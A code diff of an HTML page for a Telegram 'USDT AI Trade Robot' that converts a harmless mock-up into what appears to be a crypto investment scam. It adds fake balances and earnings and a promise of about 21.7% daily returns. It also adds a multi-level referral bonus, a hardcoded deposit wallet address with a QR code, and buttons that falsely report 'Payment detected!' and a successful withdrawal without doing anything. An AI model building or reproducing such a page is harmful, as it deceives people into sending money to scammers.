@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Apex AI Trade Robot</title>
+  <title>USDT AI Trade Robot</title>
   <style>
     :root {
       --bg-color: #081516;
@@ -53,19 +53,29 @@
     .tab-content.active { display: block; }
 
     /* Modals / Popups */
-    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 200; justify-content: center; align-items: center; }
-    .modal-content { background: var(--card-bg); width: 85%; max-width: 400px; padding: 20px; border-radius: 16px; border: 1px solid var(--border-color); text-align: center; }
-    .input-field { width: 100%; padding: 10px; background: #081516; border: 1px solid var(--border-color); border-radius: 8px; color: white; margin: 15px 0; box-sizing: border-box; }
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; justify-content: center; align-items: center; overflow-y: auto; }
+    .modal-content { background: var(--card-bg); width: 90%; max-width: 400px; padding: 20px; border-radius: 16px; border: 1px solid var(--border-color); text-align: center; position: relative; }
+    .close-modal { position: absolute; top: 15px; right: 15px; background: none; border: none; color: white; font-size: 20px; cursor: pointer; }
+    
+    /* Minting & Deposit UI Match */
+    .minting-box { background: #081516; border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin: 15px 0; display: flex; align-items: center; gap: 12px; text-align: left; }
+    .return-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 15px 0; }
+    .return-box { background: #081516; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px 5px; font-size: 11px; color: #a0aec0; }
+    .return-box div:last-child { color: var(--accent-green); font-weight: bold; font-size: 13px; margin-top: 4px; }
+    
+    .qr-container { background: white; padding: 15px; border-radius: 12px; display: inline-block; margin: 15px 0; }
+    .wallet-box { background: #081516; border: 1px solid var(--border-color); border-radius: 10px; padding: 12px; font-family: monospace; font-size: 11px; word-break: break-all; color: var(--text-main); margin: 10px 0; text-align: left; position: relative; }
+    .copy-btn { background: #1a3a3d; border: none; color: white; padding: 4px 8px; border-radius: 6px; font-size: 10px; cursor: pointer; float: right; }
   </style>
 </head>
 <body>
 
   <!-- Top Status Bar -->
   <div class="top-bar">
-    <div class="badge">👤 Affiliate Member</div>
+    <div class="badge">👤 Affiliate marketer</div>
     <div class="earned-box">
-      <span style="font-size: 12px; color: #a0aec0;">Earned:</span>
-      <span style="color: var(--accent-green); font-weight: bold;">₮ 0.00</span>
+      <span style="font-size: 12px; color: #a0aec0;">You Earned:</span>
+      <span style="color: var(--accent-green); font-weight: bold;">🟢 104.160</span>
       <button class="btn-withdraw" onclick="openModal('withdrawModal')">Withdraw ></button>
     </div>
   </div>
@@ -74,9 +84,9 @@
   <div id="tab-home" class="tab-content active">
     <div class="main-card">
       <div class="title-orange">🔥 (USDT Trade Rights)</div>
-      <div class="balance-val" id="user-balance">₮ 0.000</div>
-      <div class="daily-earn">Daily Earn: $0.00 (0.00%)</div>
-      <div class="settlement">Status: Ready for Activation</div>
+      <div class="balance-val" id="user-balance">₮ 80.000</div>
+      <div class="daily-earn">Daily Earn: $17.360 (+21.70%)</div>
+      <div class="settlement">Settlement time: 23:06:17</div>
 
       <div class="action-grid">
         <button class="btn-action btn-topup" onclick="openModal('topupModal')">🔥 Top up</button>
@@ -86,15 +96,19 @@
 
     <!-- AI Trading Status List -->
     <div class="section-card">
-      <h3 style="margin-top:0; font-size:14px; color:#a0aec0;">Active Strategy Signals</h3>
+      <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+        <button style="flex:1; background:#00b471; border:none; padding:8px; border-radius:8px; color:white; font-weight:bold;">Ai Trading status</button>
+        <button style="flex:1; background:#0f2224; border:1px solid var(--border-color); padding:8px; border-radius:8px; color:#a0aec0;">USDT Trade Rights</button>
+      </div>
+
       <div class="trade-item">
         <div class="trade-top">
-          <span>ONDO/USDT <span style="color:var(--accent-green); font-size:11px; background:#0f2224; padding:2px 6px; border-radius:4px;">short x15</span></span>
-          <span class="trade-percentage">0.00%</span>
+          <span>ONDO/USDT <span style="color:var(--accent-green); font-size:11px; background:#081516; padding:2px 6px; border-radius:4px;">short x15</span></span>
+          <span class="trade-percentage">130.11%</span>
         </div>
         <div class="trade-details">
-          <span>Entry Price: --</span>
-          <span>Latest Price: --</span>
+          <span>Entry Price: 0.39042554</span>
+          <span>Latest Price: 0.35656000</span>
         </div>
       </div>
     </div>
@@ -104,9 +118,9 @@
   <div id="tab-friends" class="tab-content">
     <div class="section-card">
       <h2>Referral and Earn</h2>
-      <p style="font-size: 13px; color: #a0aec0; line-height: 1.4;">Team bonus structure: earn commission on active level referrals.</p>
+      <p style="font-size: 13px; color: #a0aec0; line-height: 1.4;">Team bonus 14%: 5% return on Level 1 deposits, and 1% return on Levels 2 to 10 deposits.</p>
       <div style="background: #081516; padding: 12px; border-radius: 8px; border: 1px dashed var(--accent-green); font-size: 12px; word-break: break-all; color: var(--text-muted); margin-top: 10px;">
-        https://t.me/ApexGlobalTradeBot?start=ref_001
+        https://t.me/USDT_AI_Trade_bot?start=invite_code_356669
       </div>
       <button class="btn-action btn-topup" style="width:100%; margin-top:12px;" onclick="alert('Referral link copied!')">Copy Link</button>
     </div>
@@ -115,9 +129,9 @@
   <!-- TAB 3: INTRODUCTION -->
   <div id="tab-introduction" class="tab-content">
     <div class="section-card">
-      <h2>Apex AI Trade Platform</h2>
+      <h2>AE Digital Technologies LLC</h2>
       <p style="font-size: 13px; color: #a0aec0; line-height: 1.5;">
-        Automated AI trading bot infrastructure designed for decentralized asset management and secure execution.
+        Officially launched on December 9, 2025. We redefine cryptocurrency trading with artificial intelligence. Our AI system runs automatically 24/7.
       </p>
     </div>
   </div>
@@ -128,33 +142,83 @@
       <h3>Complete tasks to get rewards</h3>
       <div class="trade-item" style="display:flex; justify-content:space-between; align-items:center;">
         <div>
-          <div style="font-weight:bold; font-size:13px;">New user activation reward</div>
-          <div style="font-size:12px; color:var(--accent-green);">+ 0.00 USDT</div>
+          <div style="font-weight:bold; font-size:13px;">Join our VIP channel</div>
+          <div style="font-size:12px; color:var(--accent-green);">+ 0.50 USDT 🔥</div>
         </div>
-        <button class="btn-action btn-topup" style="padding:6px 12px; font-size:12px;" onclick="alert('No active bonus to claim yet.')">Claim</button>
+        <button class="btn-action btn-topup" style="padding:6px 12px; font-size:12px;">Join</button>
       </div>
     </div>
   </div>
 
-  <!-- MODALS -->
+  <!-- STEP 1: MINTING QUANTITY MODAL -->
   <div id="topupModal" class="modal">
     <div class="modal-content">
-      <h3>Top Up USDT</h3>
-      <p style="font-size:12px; color:#a0aec0;">Send funds to activate your trading balance.</p>
-      <input type="text" class="input-field" placeholder="Enter amount (USDT)" id="depositInput">
-      <button class="btn-action btn-topup" style="width:100%;" onclick="processDeposit()">Confirm Deposit</button>
-      <button style="background:none; border:none; color:#a0aec0; margin-top:10px; cursor:pointer;" onclick="closeModal('topupModal')">Cancel</button>
+      <button class="close-modal" onclick="closeModal('topupModal')">&times;</button>
+      <h3 style="margin-top:5px; font-size:16px;">You want to buy the quantity</h3>
+      
+      <div class="minting-box">
+        <div style="background:#00d284; width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#081516;">₮</div>
+        <div style="text-align:left;">
+          <div style="font-size:11px; color:#a0aec0;">Asset Package</div>
+          <div style="font-weight:bold; color:var(--accent-green); font-size:14px;">Minting 2 USDT</div>
+        </div>
+      </div>
+
+      <div style="text-align:left; font-size:13px; color:#a0aec0; margin-bottom:5px;">
+        Your total transaction amount will be: <span style="color:white; font-weight:bold;">$80.00 USDT</span>
+      </div>
+      
+      <div style="text-align:left; font-size:13px; color:#a0aec0;">Estimated return:</div>
+      <div class="return-grid">
+        <div class="return-box"><div>Daily</div><div>$17.36</div></div>
+        <div class="return-box"><div>100 day</div><div>$1736</div></div>
+        <div class="return-box"><div>Profit</div><div>$1656</div></div>
+      </div>
+
+      <button class="btn-action btn-topup" style="width:100%; margin-top:10px;" onclick="goToDepositAddress()">continue</button>
     </div>
   </div>
 
+  <!-- STEP 2: EXACT DEPOSIT & QR CODE MODAL -->
+  <div id="depositAddressModal" class="modal">
+    <div class="modal-content" style="max-width:360px;">
+      <button class="close-modal" onclick="closeModal('depositAddressModal')">&times;</button>
+      
+      <div style="display:flex; align-items:center; gap:8px; justify-content:center; margin-bottom:10px;">
+        <div style="background:#00d284; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#081516; font-size:12px;">₮</div>
+        <div style="text-align:left;">
+          <div style="font-weight:bold; font-size:15px;">USDT</div>
+          <div style="font-size:11px; color:#a0aec0;">BNB Smart Chain</div>
+        </div>
+      </div>
+
+      <!-- QR Code Image generated dynamically -->
+      <div class="qr-container">
+        <img id="depositQR" src="" alt="Deposit QR Code" style="width:160px; height:160px; display:block;">
+      </div>
+
+      <div class="wallet-box">
+        <button class="copy-btn" onclick="copyWalletAddress()">Copy</button>
+        <span id="walletAddressText">0xbC3C28ff9d531eC29302c36087544e6034412BA6</span>
+      </div>
+
+      <div style="font-size:11px; color:#ff9800; background:rgba(255,152,0,0.1); padding:8px; border-radius:8px; border:1px solid rgba(255,152,0,0.3); text-align:left;">
+        ⚠️ Only send <b>BNB Smart Chain</b> network assets to this address. Other assets will be lost forever.
+      </div>
+
+      <button class="btn-action btn-topup" style="width:100%; margin-top:15px;" onclick="alert('Payment detected! Processing deposit confirmation...'); closeModal('depositAddressModal');">I Have Paid</button>
+    </div>
+  </div>
+
+  <!-- WITHDRAW MODAL -->
   <div id="withdrawModal" class="modal">
     <div class="modal-content">
+      <button class="close-modal" onclick="closeModal('withdrawModal')">&times;</button>
       <h3>Withdraw Assets</h3>
-      <p style="font-size:12px; color:#a0aec0;">Available: ₮ 0.00</p>
-      <input type="text" class="input-field" placeholder="Withdrawal Address (TRC20/BEP20)">
-      <input type="text" class="input-field" placeholder="Amount to withdraw">
-      <button class="btn-action btn-topup" style="width:100%;" onclick="alert('Insufficient balance for withdrawal.')">Submit Withdrawal</button>
-      <button style="background:none; border:none; color:#a0aec0; margin-top:10px; cursor:pointer;" onclick="closeModal('withdrawModal')">Cancel</button>
+      <p style="font-size:12px; color:#a0aec0;">Available: ₮ 104.16</p>
+      <input type="text" style="width:100%; padding:10px; background:#081516; border:1px solid var(--border-color); border-radius:8px; color:white; margin:10px 0; box-sizing:border-box;" placeholder="Withdrawal Address (BEP20)">
+      <input type="text" style="width:100%; padding:10px; background:#081516; border:1px solid var(--border-color); border-radius:8px; color:white; margin:10px 0; box-sizing:border-box;" placeholder="Amount to withdraw">
+      <button class="btn-action btn-topup" style="width:100%;" onclick="alert('Withdrawal request submitted successfully.')">Confirm</button>
     </div>
   </div>
 
@@ -196,16 +260,21 @@
       document.getElementById(modalId).style.display = 'none';
     }
 
-    function processDeposit() {
-      const val = document.getElementById('depositInput').value;
-      if(val && !isNaN(val) && Number(val) > 0) {
-        document.getElementById('user-balance').innerText = '₮ ' + Number(val).toFixed(3);
-        alert('Deposit simulation successful!');
-        closeModal('topupModal');
-      } else {
-        alert('Please enter a valid amount.');
-      }
+    function goToDepositAddress() {
+      closeModal('topupModal');
+      const address = "0xbC3C28ff9d531eC29302c36087544e6034412BA6";
+      // Generate clean QR code using public API endpoint matching the address
+      document.getElementById('depositQR').src = "https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=" + address;
+      openModal('depositAddressModal');
+    }
+
+    function copyWalletAddress() {
+      const addressText = document.getElementById('walletAddressText').innerText;
+      navigator.clipboard.writeText(addressText).then(() => {
+        alert('Deposit address copied to clipboard!');
+      });
     }
   </script>
 </body>
-</html>
+          </html>
+          
